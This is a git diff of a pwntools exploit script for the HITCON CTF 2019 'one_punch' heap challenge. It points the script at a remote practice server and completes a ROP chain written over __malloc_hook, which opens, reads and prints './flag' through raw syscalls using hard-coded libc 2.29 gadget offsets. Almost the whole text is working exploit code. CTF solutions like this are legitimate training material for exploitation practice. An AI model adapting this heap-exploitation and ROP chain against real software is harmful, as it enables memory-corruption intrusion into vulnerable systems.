@@ -2,20 +2,20 @@ from pwn import *
 context(os="linux", arch="amd64")
 
 DEBUG = 1
-LOCAL = 1
+LOCAL = 0
 
 def debug_on():
 	context.log_level = "debug"
 
 g_fname = "hitcon_ctf_2019_one_punch"
 g_elf = ELF(g_fname)
-g_libcname = ""
+g_libcname = "/lib/x86_64-linux-gnu/libc-2.29.so"
 
 if (LOCAL):
 	g_io = process(g_fname)
 	g_libc = g_elf.libc
 else:
-	g_io = remote()
+	g_io = remote("node3.buuoj.cn", 27650)
 	g_libc = ELF(g_libcname)
 
 def getpid():
@@ -49,7 +49,7 @@ def delete(idx):
 	
 def backdoor(content):
 	opt("50056")
-	sa(content)
+	s(content)
 
 def pwn():
 	########################
@@ -109,21 +109,41 @@ def pwn():
 	###############################
 	# write __malloc_hook with ROP.
 	###############################
-	p_rsp = libc_base + 0x43db4 # add rsp, 0x148; ret
+	heap_buf = heap_base + 0x990
+	p_rsp = libc_base + 0x8cfd6 # add rsp, 0x48; ret
 	p_rdi = libc_base + 0x26542 # pop rdi; ret
 	p_rsi = libc_base + 0x26f9e # pop rsi; ret
 	p_rdx = libc_base + 0x12bda6 # pop rdx; ret
 	p_rax = libc_base + 0x47cf8 # pop rax; ret
+	syscall = libc_base + 0xcf6c5 # syscall; ret
 	backdoor("./flag")
 	backdoor(p64(p_rsp))
 
 	rop = flat([
-		# open("./flag")
-		
+		# open("./flag", 0, 0)
+		p_rdi, heap_base + 0x990, 
+		p_rsi, 0,
+		p_rdx, 0,
+		p_rax, 2,
+		syscall,
+		# read(3, heap_buf, 0x100)
+		p_rdi, 3, # fd
+		p_rsi, heap_buf,
+		p_rdx, 0x100,
+		p_rax, 0, # __NR_read
+		syscall,
+		# write(1, heap_buf, 0x100)
+		p_rdi, 1, # fd, stdout
+		p_rsi, heap_buf,
+		p_rdx, 0x100,
+		p_rax, 1, # __NR_write
+		syscall
 	])
+
+	new(0, rop)
 	
 if ("__main__" == __name__):
-	debug_on()
+	# debug_on()
 	pwn()
-	g_io.interactive()
+	g_io.interactive("Leo^^$")
 
